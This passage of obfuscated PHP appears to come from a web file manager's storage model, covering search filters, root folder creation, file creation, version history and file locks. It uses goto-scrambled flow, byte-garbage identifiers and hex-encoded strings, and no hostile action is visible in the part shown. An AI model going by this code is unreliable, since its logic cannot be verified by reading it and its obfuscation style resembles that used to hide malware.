$D˜à”∏ﬁ´⁄[527])); $CÛëË‘≤“à = $this->field($D˜à”∏ﬁ´⁄[396])->cache(null, 600)->where($Dı¯éÛ˘Ò≤)->count(); if ($CÛëË‘≤“à > $cã¶Íÿ∂Ô») { return $this->_listSearchChildrenNear($E–äπ≤ÍÉã, $cã¶Íÿ∂Ô»); } goto Dû°Ææ∑Öë; e¯∫∞ΩàÍ€: } private function _listSearchChildrenNear($B… ˜Ö≤ß, $a»≠∆ïõ∏’) { goto dË‚¢âªåÜ; a⁄ÆÃÜÚ§¢: if (!$a…⁄ß„Ú’Á) { return $E¡◊Ü‰∞ËÂ; } $e£õßä¬Èß = array($bÇÉ÷ ´›Í[479] => array($bÇÉ÷ ´›Í[7], $a…⁄ß„Ú’Á)); $Dõ”ÙØΩçÜ = $this->field($bÇÉ÷ ´›Í[1958])->where($e£õßä¬Èß)->limit($a»≠∆ïõ∏’)->select(); goto eã ¡¢Êëä; dË‚¢âªåÜ: $bÇÉ÷ ´›Í =& $_SERVER[™⁄»üÆ]; $E¡◊Ü‰∞ËÂ = array(); $e£õßä¬Èß = array($bÇÉ÷ ´›Í[479] => $B… ˜Ö≤ß); goto F≈ßìâ≈ö; eã ¡¢Êëä: $E¡◊Ü‰∞ËÂ = array_merge($E¡◊Ü‰∞ËÂ, array_to_keyvalue($Dõ”ÙØΩçÜ, $bÇÉ÷ ´›Í[33], $bÇÉ÷ ´›Í[396])); $E¡◊Ü‰∞ËÂ = array_slice($E¡◊Ü‰∞ËÂ, 0, $a»≠∆ïõ∏’); return $E¡◊Ü‰∞ËÂ; goto B÷£È™È©Ù; F≈ßìâ≈ö: $Dõ”ÙØΩçÜ = $this->field($bÇÉ÷ ´›Í[1958])->where($e£õßä¬Èß)->select(); $a…⁄ß„Ú’Á = array_to_keyvalue(array_filter_by_field($Dõ”ÙØΩçÜ, $bÇÉ÷ ´›Í[404], $bÇÉ÷ ´›Í[87]), $bÇÉ÷ ´›Í[33], $bÇÉ÷ ´›Í[396]); $E¡◊Ü‰∞ËÂ = array_merge($E¡◊Ü‰∞ËÂ, array_to_keyvalue($Dõ”ÙØΩçÜ, $bÇÉ÷ ´›Í[33], $bÇÉ÷ ´›Í[396])); goto a⁄ÆÃÜÚ§¢; B÷£È™È©Ù: } private function _listSearchBindPinyin($fã≈ÂæﬂÕƒ, &$a·Ç®À÷ê„, &$A˘´öê©Á) { goto Dÿ‚ÎØÑòé; EÖ≥∆ﬂÈÜæ: $a·Ç®À÷ê„ = $cﬁ–’ÁÒË“; goto fÔ∏ŸÖû‚·; Aêä·√˘ÓÊ: foreach ($a·Ç®À÷ê„ as $aáÚ∂ˆ££Ü => $D⁄¥≈ï•¬ã) { $cﬁ–’ÁÒË“[$düàﬂπñÔÕ[1960] . $aáÚ∂ˆ££Ü] = $D⁄¥≈ï•¬ã; } foreach ($dÈøÒÿÉÚ“ as $aöë◊Àﬁ™ï) { $cﬁ–’ÁÒË“[] = array($düàﬂπñÔÕ[1962] => $aöë◊Àﬁ™ï, $düàﬂπñÔÕ[967] => $düàﬂπñÔÕ[1798], array($düàﬂπñÔÕ[1963] => $aöë◊Àﬁ™ï, $düàﬂπñÔÕ[1964] => array($düàﬂπñÔÕ[7], array($düàﬂπñÔÕ[445], $düàﬂπñÔÕ[444])))); } $this->join($c¥æÂÎæå≈); goto EÖ≥∆ﬂÈÜæ; dç¨ÒÖìËÒ: $c¥æÂÎæå≈ = "\x4c\105\106\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\x69\157\137\x73\157\165\162\x63\145\137\x6d\145\164\141\x20\x6d\x65\x74\x61\40\157\x6e\x20\x73\x6f\x75\x72\143\145\56\163\x6f\x75\x72\x63\145\x49\104\40\75\x20\x6d\x65\164\x61\x2e\163\157\x75\162\143\145\111\104"; $cﬁ–’ÁÒË“ = array(); $A˘´öê©Á = str_replace(array($düàﬂπñÔÕ[229], $düàﬂπñÔÕ[50], $düàﬂπñÔÕ[1959]), $düàﬂπñÔÕ[33], $A˘´öê©Á); goto F…°¯õﬂËç; F…°¯õﬂËç: $A˘´öê©Á = $düàﬂπñÔÕ[1960] . str_replace($düàﬂπñÔÕ[47], $düàﬂπñÔÕ[1961], $A˘´öê©Á); $dÈøÒÿÉÚ“ = $a·Ç®À÷ê„[$düàﬂπñÔÕ[28]]; unset($a·Ç®À÷ê„[$düàﬂπñÔÕ[28]]); goto Aêä·√˘ÓÊ; Dÿ‚ÎØÑòé: $düàﬂπñÔÕ =& $_SERVER[™⁄»üÆ]; if (!isset($fã≈ÂæﬂÕƒ[$düàﬂπñÔÕ[1794]]) || !$fã≈ÂæﬂÕƒ[$düàﬂπñÔÕ[1794]]) { return; } if (!Input::check($fã≈ÂæﬂÕƒ[$düàﬂπñÔÕ[1794]], $düàﬂπñÔÕ[316]) || strlen($fã≈ÂæﬂÕƒ[$düàﬂπñÔÕ[1794]]) < 2) { return; } goto dç¨ÒÖìËÒ; fÔ∏ŸÖû‚·: } private function _parseSearchWhere($B˜ÁÇñÃπÁ) { goto Dê¢ÖºÂãÀ; BΩ¬£üáÇ¨: if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1794]]) && trim($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1794]])) { $D≤ÔıîáÈ = trim($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1794]]); $EÿıËÖâá = explode($a«ÀÂ˜Ç≠É[50], $D≤ÔıîáÈ); if (strlen($D≤ÔıîáÈ) > 2 && (substr($D≤ÔıîáÈ, 0, 1) == $a«ÀÂ˜Ç≠É[116] && substr($D≤ÔıîáÈ, -1) == $a«ÀÂ˜Ç≠É[116]) || substr($D≤ÔıîáÈ, 0, 1) == $a«ÀÂ˜Ç≠É[55] && substr($D≤ÔıîáÈ, -1) == $a«ÀÂ˜Ç≠É[55]) { $D≤ÔıîáÈ = substr($D≤ÔıîáÈ, 1, -1); $EÿıËÖâá = array($D≤ÔıîáÈ); } $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[28]] = array(array($a«ÀÂ˜Ç≠É[526], $a«ÀÂ˜Ç≠É[1796] . $D≤ÔıîáÈ . $a«ÀÂ˜Ç≠É[1796])); if (count($EÿıËÖâá) > 1) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[28]] = array(); foreach ($EÿıËÖâá as $fµ∏É–¶¬ñ) { if (!trim($fµ∏É–¶¬ñ)) { continue; } $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[28]][] = array($a«ÀÂ˜Ç≠É[526], $a«ÀÂ˜Ç≠É[1796] . trim($fµ∏É–¶¬ñ) . $a«ÀÂ˜Ç≠É[1796]); } } } return $CÉ¶‹Ö≤„∆; goto cé⁄ëÓÍêŸ; Dê¢ÖºÂãÀ: $a«ÀÂ˜Ç≠É =& $_SERVER[™⁄»üÆ]; $CÉ¶‹Ö≤„∆ = array(); if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[740]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[740]]) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[84]] = array($a«ÀÂ˜Ç≠É[1965], $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[740]]); } goto EºƒõÊ∑ù; CÉô‹≤¬¯ﬁ: if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[576]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[576]]) { $CÉ¶‹Ö≤„∆[] = array($a«ÀÂ˜Ç≠É[435] => $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[576]], $a«ÀÂ˜Ç≠É[433] => $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[576]], $a«ÀÂ˜Ç≠É[967] => $a«ÀÂ˜Ç≠É[1798]); } if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[406]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[406]]) { $eØ˜„ùçØ = $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[406]]; if ($eØ˜„ùçØ == $a«ÀÂ˜Ç≠É[77]) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[404]] = 1; } else { if ($eØ˜„ùçØ == $a«ÀÂ˜Ç≠É[1968]) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[404]] = 0; } else { if ($eØ˜„ùçØ) { $eØ˜„ùçØ = is_array($eØ˜„ùçØ) ? $eØ˜„ùçØ : explode($a«ÀÂ˜Ç≠É[47], $eØ˜„ùçØ); $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[406]] = array($a«ÀÂ˜Ç≠É[412], $eØ˜„ùçØ); $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[404]] = 0; } } } } if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[479]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[479]]) { $A£¬êâé–Ö = $this->sourceInfo($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[479]]); $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[567]] = array($a«ÀÂ˜Ç≠É[526], $A£¬êâé–Ö[$a«ÀÂ˜Ç≠É[503]] . $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[479]] . $a«ÀÂ˜Ç≠É[527]); } goto BΩ¬£üáÇ¨; EºƒõÊ∑ù: if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[477]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[477]]) { $CáÙ«çó®— = array($a«ÀÂ˜Ç≠É[1966], $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[477]]); if ($CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[84]]) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[84]] = array($CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[84]], $CáÙ«çó®—, $a«ÀÂ˜Ç≠É[1967]); } else { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[84]] = $CáÙ«çó®—; } } if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1956]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1956]] > 0) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[78]] = array($a«ÀÂ˜Ç≠É[1965], $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1956]]); } if (isset($B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1957]]) && $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1957]]) { $CáÙ«çó®— = array($a«ÀÂ˜Ç≠É[1966], $B˜ÁÇñÃπÁ[$a«ÀÂ˜Ç≠É[1957]]); if ($CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[78]]) { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[78]] = array($CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[78]], $CáÙ«çó®—, $a«ÀÂ˜Ç≠É[1967]); } else { $CÉ¶‹Ö≤„∆[$a«ÀÂ˜Ç≠É[78]] = $CáÙ«çó®—; } } goto CÉô‹≤¬¯ﬁ; cé⁄ëÓÍêŸ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($F≤ΩÔÿ¯¬Ø) { $C“Ñû‡«πö =& $_SERVER[™⁄»üÆ]; $B≥≠Ê›çªÓ = Model($C“Ñû‡«πö[495])->where(array($C“Ñû‡«πö[1528] => $F≤ΩÔÿ¯¬Ø))->find(); $d’Ú¨¥€µé = $this->_mkdirRoot(SourceModel::TYPE_USER, $F≤ΩÔÿ¯¬Ø, $B≥≠Ê›çªÓ[$C“Ñû‡«πö[28]]); $this->userDesktopAdd($d’Ú¨¥€µé); return $d’Ú¨¥€µé; } public function userDesktopAdd($c∂≈ìùÆ‹œ) { $A„Ω™œıáù =& $_SERVER[™⁄»üÆ]; $d∂ã¬´ÑŸΩ = LNG($A„Ω™œıáù[1969]); $AûåˆÆº›á = $this->mkdir($c∂≈ìùÆ‹œ, $d∂ã¬´ÑŸΩ); $this->metaSet($AûåˆÆº›á, $A„Ω™œıáù[1970], $A„Ω™œıáù[87]); $this->metaSet($c∂≈ìùÆ‹œ, $A„Ω™œıáù[1971], $AûåˆÆº›á); } public function groupRootAdd($bÊ≥∆˜ÜÈµ) { $C£™óÖìÖ =& $_SERVER[™⁄»üÆ]; $E€≥√ÀûÕÉ = Model($C£™óÖìÖ[504])->where(array($C£™óÖìÖ[1790] => $bÊ≥∆˜ÜÈµ))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $bÊ≥∆˜ÜÈµ, $E€≥√ÀûÕÉ[$C£™óÖìÖ[28]]); } public function systemRootPathAdd($C¿ä’Ö‡™û) { if ($C¿ä’Ö‡™û != $_SERVER[™⁄»üÆ][519]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $C¿ä’Ö‡™û); } public function userRootRemove($Cèü—º¥ÎÆ) { $D∆¿ıπ‘§¿ = $this->sourceRoot(SourceModel::TYPE_USER, $Cèü—º¥ÎÆ); if (!$D∆¿ıπ‘§¿) { return; } $this->remove($D∆¿ıπ‘§¿, !1); } public function groupRootRemove($aÉ¥Ì¨è˜∫) { $aæ‡Ç ≈“ú = $this->sourceRoot(SourceModel::TYPE_GROUP, $aÉ¥Ì¨è˜∫); if (!$aæ‡Ç ≈“ú) { return; } $this->remove($aæ‡Ç ≈“ú, !1); } private function _mkdirRoot($bµÀû ÛÍﬂ, $AÒÑÈ€ÿ◊±, $eÒ‰åÙ——™) { goto b˜ìïÃÁ£Ç; b˜ìïÃÁ£Ç: $fà€àÚìˆó =& $_SERVER[™⁄»üÆ]; $CÃÙà¡π¥ó = array($fà€àÚìˆó[395] => 0, $fà€àÚìˆó[563] => $bµÀû ÛÍﬂ, $fà€àÚìˆó[564] => $AÒÑÈ€ÿ◊±, $fà€àÚìˆó[560] => 1, $fà€àÚìˆó[565] => USER_ID, $fà€àÚìˆó[566] => USER_ID, $fà€àÚìˆó[561] => $fà€àÚìˆó[33], $fà€àÚìˆó[567] => $fà€àÚìˆó[513], $fà€àÚìˆó[423] => 0, $fà€àÚìˆó[562] => 0, $fà€àÚìˆó[449] => 0, $fà€àÚìˆó[568] => $fà€àÚìˆó[33]); if ($dê∆‡««∏¨ = $this->where($CÃÙà¡π¥ó)->find()) { return $dê∆‡««∏¨[$fà€àÚìˆó[396]]; } goto A≈ó‚ Çæä; A≈ó‚ Çæä: $fê¶≠∆©çÚ = "\x4d\157\144\145\154\x53\x6f\165\162\143\x65\x2e\x6d\153\x64\151\162\122\x6f\157\164\56{$bµÀû ÛÍﬂ}\x2e{$AÒÑÈ€ÿ◊±}\x2e" . $eÒ‰åÙ——™; CacheLock::lock($fê¶≠∆©çÚ); $CÃÙà¡π¥ó[$fà€àÚìˆó[28]] = $eÒ‰åÙ——™; goto a’ÉÛÒ≠ëŸ; CÈÜ‡’û£ç: CacheLock::unlock($fê¶≠∆©çÚ); return $CÂóÒ–ﬁ£µ; goto EÖ´¡äôÃΩ; a’ÉÛÒ≠ëŸ: $CÂóÒ–ﬁ£µ = $this->add($CÃÙà¡π¥ó); $aõíΩü◊èΩ = array($fà€àÚìˆó[569] => short_id($CÂóÒ–ﬁ£µ)); $this->where(array($fà€àÚìˆó[411] => $CÂóÒ–ﬁ£µ))->save($aõíΩü◊èΩ); goto CÈÜ‡’û£ç; EÖ´¡äôÃΩ: } private function sourceRoot($E©ç“√µÇà, $c¨Í«Àäîå, $aü‰°†ò◊› = false) { $bÀ”≠õª¬… =& $_SERVER[™⁄»üÆ]; $bÖ˘•≈í≠∂ = array($bÀ”≠õª¬…[395] => 0, $bÀ”≠õª¬…[563] => $E©ç“√µÇà, $bÀ”≠õª¬…[564] => $c¨Í«Àäîå); if ($E∆€Íâàµè = $this->where($bÖ˘•≈í≠∂)->find()) { return $aü‰°†ò◊› ? $E∆€Íâàµè : $E∆€Íâàµè[$bÀ”≠õª¬…[396]]; } return !1; } public function sourceRootGroup($cıÖé”Ù“≈) { goto dßã°Æú€Ω; dßã°Æú€Ω: $cå†ë“§é´ =& $_SERVER[™⁄»üÆ]; if (is_string($cıÖé”Ù“≈)) { $cıÖé”Ù“≈ = array($cıÖé”Ù“≈); } $f◊ı≤ „Œß = array($cå†ë“§é´[395] => 0, $cå†ë“§é´[564] => array($cå†ë“§é´[7], $cıÖé”Ù“≈), $cå†ë“§é´[563] => SourceModel::TYPE_GROUP); goto C¿æà∆∆ì‰; C¿æà∆∆ì‰: $this->selectPageReset(); $EÖ¨òÒåΩΩ = $this->limit(count($cıÖé”Ù“≈))->listSource($f◊ı≤ „Œß, 1000); $this->selectPageRestore(); goto C¨ﬁÎ‹Ò–‘; C¨ﬁÎ‹Ò–‘: return array_to_keyvalue($EÖ¨òÒåΩΩ[$cå†ë“§é´[75]], $cå†ë“§é´[485]); goto CêÉÇ˜õìÀ; CêÉÇ˜õìÀ: } public function mkfile($aﬁ⁄ÎŸ≈˘´, $a·Òäû÷óÙ, $C÷í≥êá¬õ = '', $EÀ◊‚©œ⁄± = REPEAT_RENAME) { $c™ÙÔôﬁ§û =& $_SERVER[™⁄»üÆ]; $f∞„Í≈÷ä¥ = Model($c™ÙÔôﬁ§û[585])->addFileByContent($C÷í≥êá¬õ, $a·Òäû÷óÙ); return $this->_createFileCall($aﬁ⁄ÎŸ≈˘´, $a·Òäû÷óÙ, $f∞„Í≈÷ä¥, $EÀ◊‚©œ⁄±, $c™ÙÔôﬁ§û[1224]); } public function addFile($cçÌ±◊ıﬁ≤, $cö–»Òï¥Ÿ, $dÑÑå≤ï¿¨, $bÈ»íÙ∂ÿ§ = false, $béÀÑÃ“Ó’ = REPEAT_RENAME) { $Fìæ©æ≠åÊ = Model($_SERVER[™⁄»üÆ][585])->addFile($cö–»Òï¥Ÿ, $dÑÑå≤ï¿¨, $bÈ»íÙ∂ÿ§); return $this->_createFileCall($cçÌ±◊ıﬁ≤, $dÑÑå≤ï¿¨, $Fìæ©æ≠åÊ, $béÀÑÃ“Ó’); } public function addFileByFileID($b…·ë®ô≤Ô, $F—¢ºèåΩÉ, $AÃ–èê’øè, $Fê¡àÖœå√ = REPEAT_RENAME) { $BØòˆ∑∂è∂ =& $_SERVER[™⁄»üÆ]; $aÍ¢÷æƒ∆ü = Model($BØòˆ∑∂è∂[585])->find($F—¢ºèåΩÉ); Model($BØòˆ∑∂è∂[585])->linkAdd($F—¢ºèåΩÉ); return $this->_createFileCall($b…·ë®ô≤Ô, $AÃ–èê’øè, $aÍ¢÷æƒ∆ü, $Fê¡àÖœå√); } public function addFileByRemote($Fßå®üë‰æ, $d«™Éãƒ°∏, $DÉ¨æœè¶ƒ, $fÃ∞ƒì∑£∆ = array(), $A§ä≈ÙÊ∞ñ = REPEAT_RENAME) { $CÌπŸﬁÿõ› = Model($_SERVER[™⁄»üÆ][585])->addFileByRemote($d«™Éãƒ°∏, $DÉ¨æœè¶ƒ, $fÃ∞ƒì∑£∆); return $this->_createFileCall($Fßå®üë‰æ, $DÉ¨æœè¶ƒ, $CÌπŸﬁÿõ›, $A§ä≈ÙÊ∞ñ); } private function _createFileCall($EÃ‚÷±ßÓÕ, $FÁõ°≈ı¨œ, $e∞®·∞ºÙÔ, $Fÿ…¬ùãÛ≤, $cëÜœ ¡ﬂ® = "\x75\x70\x6c\157\x61\x64") { goto cÃÁâòâì˜; Cê≠‘Ç˘ßÍ: $this->lockWriteStart($EÃ‚÷±ßÓÕ, $FÁõ°≈ı¨œ); $aπ‘´Ô§˘ù = $this->fileNameExist($EÃ‚÷±ßÓÕ, $FÁõ°≈ı¨œ); $B€ëßŒ÷Êç = $this->_createFile($EÃ‚÷±ßÓÕ, $FÁõ°≈ı¨œ, $e∞®·∞ºÙÔ, $Fÿ…¬ùãÛ≤, $fããú∆Ÿó’); goto Cø¢ù·ÀÑ·; Cù∏Çœ„êﬁ: return $B€ëßŒ÷Êç; goto FÆÌæ©º¶ê; cÃÁâòâì˜: $e’êçá¬ìÏ =& $_SERVER[™⁄»üÆ]; $fããú∆Ÿó’ = !1; $this->setMasterDB(); goto Cê≠‘Ç˘ßÍ; Cø¢ù·ÀÑ·: if (!$fããú∆Ÿó’) { Model($e’êçá¬ìÏ[451])->remove($e∞®·∞ºÙÔ[$e’êçá¬ìÏ[448]]); } if ($fããú∆Ÿó’ && $B€ëßŒ÷Êç && $B€ëßŒ÷Êç != $aπ‘´Ô§˘ù) { Model($e’êçá¬ìÏ[1940])->eventCreate($B€ëßŒ÷Êç, $cëÜœ ¡ﬂ®); } $this->lockWriteEnd($EÃ‚÷±ßÓÕ, $FÁõ°≈ı¨œ); goto Cù∏Çœ„êﬁ; FÆÌæ©º¶ê: } public function mkdir($f ±öå‘∆å, $A›Ê†ùÃ¨, $D•≤çª¶”ä = REPEAT_SKIP) { goto C¿‘≠å¶ﬁû; bÆå≠Ü¯Ö€: $aæä∑®»≠ú = array($A˜”¶†™óƒ[560] => 1, $A˜”¶†™óƒ[414] => $A›Ê†ùÃ¨, $A˜”¶†™óƒ[561] => $A˜”¶†™óƒ[33], $A˜”¶†™óƒ[449] => 0, $A˜”¶†™óƒ[562] => 0); $dˆ•˘äã‹Ñ = $this->_addSoure($aæä∑®»≠ú, $AäòÏ∫åô€); Model($A˜”¶†™óƒ[1940])->eventCreate($dˆ•˘äã‹Ñ, $A˜”¶†™óƒ[1225]); goto aˆ÷¿‰√£ª; C¿‘≠å¶ﬁû: $A˜”¶†™óƒ =& $_SERVER[™⁄»üÆ]; $this->setMasterDB(); $AäòÏ∫åô€ = $this->sourceInfo($f ±öå‘∆å); goto e‘Ùë÷éΩ„; aˆ÷¿‰√£ª: $this->lockWriteEnd($f ±öå‘∆å, $A›Ê†ùÃ¨); return $dˆ•˘äã‹Ñ; goto F¿ΩÈ£ãé·; e‘Ùë÷éΩ„: if (!$AäòÏ∫åô€) { return !1; } $this->lockWriteStart($f ±öå‘∆å, $A›Ê†ùÃ¨); if ($D•≤çª¶”ä !== !1) { $DÚ®àÙÔ◊≤ = $this->fileNameExist($f ±öå‘∆å, $A›Ê†ùÃ¨); if ($DÚ®àÙÔ◊≤ && $D•≤çª¶”ä != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($f ±öå‘∆å, $A›Ê†ùÃ¨); return $DÚ®àÙÔ◊≤; } $A›Ê†ùÃ¨ = $this->fileNameAuto($f ±öå‘∆å, $A›Ê†ùÃ¨, $D•≤çª¶”ä); } goto bÆå≠Ü¯Ö€; F¿ΩÈ£ãé·: } private function _createFile($d’‚á˘¬°õ, $aÇãâúÓ‡¶, $D€É∏ãΩ≈õ, $DƒÃ«Öÿ˘Ø, &$cÑÌΩ´‘°ë) { goto a¶Êû¡«é; B¡õΩ¿ô“©: return $B´ôÖû’ÿ˘; goto Dõﬂç˜ö„é; Dáìô∑˘å‰: if ($DƒÃ«Öÿ˘Ø !== !1) { $dÒÜíıèÇì = $this->fileNameExist($d’‚á˘¬°õ, $aÇãâúÓ‡¶); } $cÑÌΩ´‘°ë = !0; if ($DƒÃ«Öÿ˘Ø && $dÒÜíıèÇì) { if ($DƒÃ«Öÿ˘Ø == REPEAT_SKIP) { $cÑÌΩ´‘°ë = !1; return $dÒÜíıèÇì; } else { if ($DƒÃ«Öÿ˘Ø == REPEAT_REPLACE) { $c·Ω“ñ√§î = $this->sourceInfo($dÒÜíıèÇì); $b’Ê⁄∑Ùÿ◊ = $this->fileHistory($c·Ω“ñ√§î, $D€É∏ãΩ≈õ[$CåÙ£Œ»ï™[448]], $D€É∏ãΩ≈õ[$CåÙ£Œ»ï™[78]]); if (!$b’Ê⁄∑Ùÿ◊) { $cÑÌΩ´‘°ë = !1; } else { $this->folderSizeReset($d’‚á˘¬°õ); } return $dÒÜíıèÇì; } else { $aÇãâúÓ‡¶ = $this->fileNameAuto($d’‚á˘¬°õ, $aÇãâúÓ‡¶, $DƒÃ«Öÿ˘Ø, !1); } } } goto D™ë•ÁÛÖ…; D™ë•ÁÛÖ…: $B∞åõ™πÔ = array($CåÙ£Œ»ï™[560] => 0, $CåÙ£Œ»ï™[414] => $aÇãâúÓ‡¶, $CåÙ£Œ»ï™[561] => substr(get_path_ext($aÇãâúÓ‡¶), 0, 10), $CåÙ£Œ»ï™[449] => $D€É∏ãΩ≈õ[$CåÙ£Œ»ï™[448]], $CåÙ£Œ»ï™[562] => $D€É∏ãΩ≈õ[$CåÙ£Œ»ï™[78]]); $B´ôÖû’ÿ˘ = $this->_addSoure($B∞åõ™πÔ, $e”„®‰ÈªŒ); $this->folderSizeReset($d’‚á˘¬°õ, intval($B∞åõ™πÔ[$CåÙ£Œ»ï™[78]])); goto B¡õΩ¿ô“©; a¶Êû¡«é: $CåÙ£Œ»ï™ =& $_SERVER[™⁄»üÆ]; $e”„®‰ÈªŒ = $this->sourceInfo($d’‚á˘¬°õ); if (!$D€É∏ãΩ≈õ || !$e”„®‰ÈªŒ) { return !1; } goto Dáìô∑˘å‰; Dõﬂç˜ö„é: } protected function fileHistory($d•√È©Õå‘, $eáÙΩóˆùà, $cõ˜ﬂïÇñû) { goto cı›’ ûÔ·; cı›’ ûÔ·: $Cä˜ıëÃ—¨ =& $_SERVER[™⁄»üÆ]; $Cü˘—áòöÏ = defined($Cä˜ıëÃ—¨[455]) ? USER_ID : $Cä˜ıëÃ—¨[191]; if ($d•√È©Õå‘[$Cä˜ıëÃ—¨[448]] == $eáÙΩóˆùà) { return !1; } goto d£≠ç‡¨¶Ñ; báœÜò∑ÎÑ: $this->where(array($Cä˜ıëÃ—¨[411] => $d•√È©Õå‘[$Cä˜ıëÃ—¨[396]]))->save($DàØ¶õ‘—Ω); $this->sourceCacheClear($d•√È©Õå‘[$Cä˜ıëÃ—¨[396]]); return !0; goto bäà¨àÃ÷ê; d£≠ç‡¨¶Ñ: $this->checkLock($d•√È©Õå‘[$Cä˜ıëÃ—¨[396]], $eáÙΩóˆùà); Model($Cä˜ıëÃ—¨[1972])->addHistory($d•√È©Õå‘); $DàØ¶õ‘—Ω = array($Cä˜ıëÃ—¨[566] => $Cü˘—áòöÏ, $Cä˜ıëÃ—¨[418] => time(), $Cä˜ıëÃ—¨[448] => $eáÙΩóˆùà, $Cä˜ıëÃ—¨[78] => $cõ˜ﬂïÇñû); goto báœÜò∑ÎÑ; bäà¨àÃ÷ê: } public function checkLock($fÎ¬ÎﬂΩöÔ, $F„‹∂Ù„˜ê) { goto Dâ–°≠π∂π; D∂«úƒåµ≠: $this->_createFileCall($b›ªÔáÁ‰…[$Aìûﬂ˜∞ßú[479]], $Eòñö¶€üË, $c„≠ËÔΩ»Ë, REPEAT_REPLACE, $Aìûﬂ˜∞ßú[1224]); $f‰Çä‹»¥“ = $b›ªÔáÁ‰…[$Aìûﬂ˜∞ßú[446]][$Aìûﬂ˜∞ßú[524]]; $bØÓÑ‘û™ê = $f‰Çä‹»¥“[$Aìûﬂ˜∞ßú[1974]] ? $f‰Çä‹»¥“[$Aìûﬂ˜∞ßú[1974]] : $f‰Çä‹»¥“[$Aìûﬂ˜∞ßú[28]]; goto cÕŒÿñ˘’≈; cÕŒÿñ˘’≈: show_json(LNG($Aìûﬂ˜∞ßú[1975]) . $Aìûﬂ˜∞ßú[1976] . LNG($Aìûﬂ˜∞ßú[1977]) . $Aìûﬂ˜∞ßú[1978] . $bØÓÑ‘û™ê . $Aìûﬂ˜∞ßú[1979], !1); goto E™∫≤Ç›ìñ; B∑”Ñ›üπÙ: $Eï≥úº–ÿè = Session::get($Aìûﬂ˜∞ßú[1973]); $Eòñö¶€üË = substr($b›ªÔáÁ‰…[$Aìûﬂ˜∞ßú[28]], 0, -1 - strlen($b›ªÔáÁ‰…[$Aìûﬂ˜∞ßú[168]])) . $Aìûﬂ˜∞ßú[1489] . $Eï≥úº–ÿè . $Aìûﬂ˜∞ßú[95] . $b›ªÔáÁ‰…[$Aìûﬂ˜∞ßú[168]]; $c„≠ËÔΩ»Ë = Model($Aìûﬂ˜∞ßú[585])->find($F„‹∂Ù„˜ê); goto D∂«úƒåµ≠; Dâ–°≠π∂π: $Aìûﬂ˜∞ßú =& $_SERVER[™⁄»üÆ]; $b›ªÔáÁ‰… = $this->pathInfo($fÎ¬ÎﬂΩöÔ); if (!$this->fileIsLock($b›ªÔáÁ‰…, !0)) { return; } goto B∑”Ñ›üπÙ; E™∫≤Ç›ìñ: } public function fileIsLock($bñ°®ÛÎ®“, $D∏ÉÃ‡¥‹Õ = false) { goto C∞≈ÃÁ ⁄∆; C∞≈ÃÁ ⁄∆: $f√è¶Ûªµª =& $_SERVER[™⁄»üÆ]; if (!isset($bñ°®ÛÎ®“[$f√è¶Ûªµª[446]]) || !$bñ°®ÛÎ®“[$f√è¶Ûªµª[446]][$f√è¶Ûªµª[521]]) { return !1; } if ($bñ°®ÛÎ®“[$f√è¶Ûªµª[446]][$f√è¶Ûªµª[521]] != USER_ID) { return !0; } goto cÛ”ÊßãÂ∑; Dˆ˘ë¡”œ§: return !1; goto dò¿çêÎ°Â; cÛ”ÊßãÂ∑: $BÓœé‹ƒ˜° = $GLOBALS[$f√è¶Ûªµª[6]][$f√è¶Ûªµª[88]][$f√è¶Ûªµª[522]]; if ($bñ°®ÛÎ®“[$f√è¶Ûªµª[446]][$f√è¶Ûªµª[523]] <= time() - 